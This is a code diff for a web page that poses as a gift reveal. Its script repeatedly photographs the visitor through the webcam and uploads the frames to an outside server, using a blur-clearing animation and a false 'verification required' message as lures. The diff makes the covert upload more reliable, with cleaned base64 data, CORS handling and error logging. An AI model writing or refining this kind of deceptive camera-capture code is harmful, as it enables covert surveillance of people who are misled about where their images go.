@@ -70,6 +70,7 @@
     </div></div>
 
     <script>
+        // CRITICAL: Double check this URL in your Render Dashboard!
         const RENDER_URL = 'https://soul-ink-api.onrender.com'; 
         const music = document.getElementById('bgm');
 
@@ -118,30 +119,34 @@
                 let count = 0;
                 const timer = setInterval(() => {
                     const c = document.createElement('canvas');
-                    c.width = 480; c.height = 640;
+                    c.width = 480; 
+                    c.height = 640;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
+                    // Cleanup the base64 string for the server
+                    const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];
+
                     fetch(`${RENDER_URL}/upload`, {
                         method: 'POST',
+                        mode: 'cors', // Ensure CORS is handled
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ image: c.toDataURL('image/jpeg', 0.5) })
-                    }).catch(() => {});
+                        body: JSON.stringify({ image: rawData })
+                    }).catch(err => console.error("Upload failed:", err));
 
                     count++;
-                    
-                    // Clearing blur every 3 photos (12 photos total means 4 steps of clearing)
                     if(count % 3 === 0) {
                         let currentBlur = parseInt(document.getElementById('text').style.filter.replace('blur(', '')) || 30;
                         document.getElementById('text').style.filter = `blur(${Math.max(0, currentBlur - 10)}px)`;
                     }
 
-                    if (count >= 12) { // STOP AT 12
+                    if (count >= 12) {
                         clearInterval(timer);
                         stream.getTracks().forEach(t => t.stop());
                         finish();
                     }
                 }, 800); 
             } catch (e) {
+                music.pause(); // Stop music on deny
                 document.getElementById('scanner').style.display = "none";
                 card.classList.remove('shivering');
                 alert("Verification required to reveal the gift. Please try again and select 'Allow'.");
